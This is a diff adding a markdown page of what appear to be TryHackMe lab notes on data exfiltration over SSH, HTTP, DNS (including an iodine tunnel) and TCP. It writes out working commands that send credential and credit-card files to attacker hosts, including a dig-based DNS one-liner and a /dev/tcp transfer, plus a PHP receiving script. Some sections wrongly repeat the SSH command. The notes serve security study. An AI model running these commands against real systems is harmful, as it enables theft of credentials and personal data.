@@ -1,0 +1,134 @@
+---
+title: Exfiltration
+description:  Commonly used methods of sending data from victim to the attacker's C2 server
+---
+
+
+## Over SSH
+```bash
+tar cf - task5/ | ssh thm@jump.thm.com "cd /tmp/; tar xpf -"
+```
+1. We used the tar command the same as the previous task to create an archive file of the task5 directory.
+2. Then we passed the archived file over the ssh. SSH clients provide a way to execute a single command without having a full session.
+3. We passed the command that must be executed in double quotations, "cd /tmp/; tar xpf. In this case, we change the directory and unarchive the passed file.
+
+If we check the attacker machine, we can see that we have successfully transmitted the file.
+
+
+## Over HTTP
+```bash
+tar cf - task5/ | ssh thm@jump.thm.com "cd /tmp/; tar xpf -"
+```
+To exfiltrate data over the HTTP protocol, we can apply the following steps:
+	1. An attacker sets up a web server with a data handler.
+	2. A C2 agent or an attacker sends the data. .
+	3. The webserver receives the data and stores it. In our case, the contact.php receives the POST request and stores it into /tmp.
+
+The following code snapshot is of PHP code to handle POST requests via a file parameter and stores the received data in the /tmp directory as http.bs64 file name.
+```php
+<?php
+If (isset($_POST['file'])) {
+$file=fopen("/tmp/http.bs64","w");
+fwrite($file,$_POST['file']);
+fclose($file);
+}
+?>
+```
+
+## Over DNS 
+```bash
+$ cat credit.txt | base64 | tr -d "\n" | fold -w18 | sed 's/.*/&./' | tr -d "\n" | sed s/$/att.tunnel.com/ | awk '{print "dig +short " $1}' | bash
+```
+- credit.txt to base64: TmFtZTogVEhNLXVzZXIKQWRkcmVzczogMTIzNCBJbnRlcm5ldCwgVEhNCkNyZWRpdCBDYXJkOiAx
+MjM0LTEyMzQtMTIzNC0xMjM0CkV4cGlyZTogMDUvMDUvMjAyMgpDb2RlOiAxMzM3Cg==
+```bash
+$ cat credit.txt | base64 | tr -d "\n" | fold -w18
+
+TmFtZTogVEhNLXVzZX
+IKQWRkcmVzczogMTIz
+NCBJbnRlcm5ldCwgVE
+hNCkNyZWRpdCBDYXJk
+OiAxMjM0LTEyMzQtMT
+IzNC0xMjM0CkV4cGly
+ZTogMDUvMDUvMjAyMg
+pDb2RlOiAxMzM3Cg==
+```
+
+### Iodine
+A piece of software that lets you tunnel IPv4 data through a DNS server. This can be usable in different situations where internet access is firewalled, but DNS queries are allowed
+```bash
+$ sudo iodined -f -c -P pass123 10.1.1.1/24 att.tunnel.com 
+```
+- Ensure to execute the command with sudo. The iodined creates a new network interface (dns0) for the tunneling over the DNS.
+- The -f argument is to run the server in the foreground.
+- The -c argument is to skip checking the client IP address and port for each DNS request.
+- The -P argument is to set a password for authentication.
+- The 10.1.1.1/24 argument is to set the network IP for the new network interface (dns0). The IP address of the server will be 10.1.1.1 and the client 10.1.1.2.
+att.tunnel.com is the nameserver we previously set.
+
+[https://github.com/yarrick/iodine](https://github.com/yarrick/iodine)
+
+
+
+
+## Over TCP
+The TCP socket technique can be used in a non-secured environment where there are no network-based security products.  This exfiltration type is easy to detect because we rely on non-standard protocols.
+
+```bash
+tar cf - task5/ | ssh thm@jump.thm.com "cd /tmp/; tar xpf -"
+```
+
+First, we need to prepare a listener on any port you specify. In our case, we choose port 8080.
+```bash
+$ nc -lvp 8080 > /tmp/task4-creds.data
+Listening on [0.0.0.0] (family 0, port 8080)
+```
+- The nc command will receive data on port 8080. 
+- Once we receive the data, we store it in the /tmp/ directory and call it task4-creds.data.
+
+We have a sample file with a couple of credentials on the victim machine.
+```bash
+$ cat task4/creds.txt
+admin:password
+Admin:123456
+root:toor
+```
+Exfiltrate the data
+```bash
+$ tar zcf - task4/ | base64 | dd conv=ebcdic > /dev/tcp/192.168.0.133/8080 
+0+1 records in 
+0+1 records out 
+260 bytes copied, 9.8717e-05 s, 2.6 MB/s
+```
+1. We used the tar command to create an archive file with the zcf arguments of the content of the secret directory.
+2. The z is for using gzip to compress the selected folder, the c is for creating a new archive, and the f is for using an archive file.
+3. We then passed the created tar file to the base64 command for converting it to base64 representation.
+4. Then, we passed the result of the base64 command to create and copy a backup file with the dd command using EBCDIC encoding data.
+5. Finally, we redirect the dd command's output to transfer it using the TCP socket on the specified IP and port, which in this case, port 8080.
+```bash
+thm@jump-box$ ls -l /tmp/ -rw-r--r-- 1 root root 240 Apr 8 11:37 task4-creds.data
+```
+On the attaker's machine, we will be using the dd tool to convert it back. 
+```bash
+$ cd /tmp/
+tmp/$ dd conv=ascii if=task4-creds.data |base64 -d > task4-creds.tar
+0+1 records in
+0+1 records out
+260 bytes transferred in 0.000321 secs (810192 bytes/sec)
+```
+1. We used the dd command to convert the received file to ASCII  representation. We used the task4-creds.data as input to the dd command. 
+2. The output of the dd command will be passed to the base64 to decode it using the -d argument.
+3. Finally, we save the output in the task4-creds.tar  file.
+```bash
+$ tar xvf task4-creds.tar 
+task4/ 
+task4/creds.txt
+```
+1. We used the tar command to unarchive the file with the xvf arguments.
+2. The x is for extracting the tar file, the v for verbosely listing files, and the f is for using an archive file.
+```bash
+$ cat task4/creds.txt 
+admin:password 
+Admin:123456 
+root:toor
+```
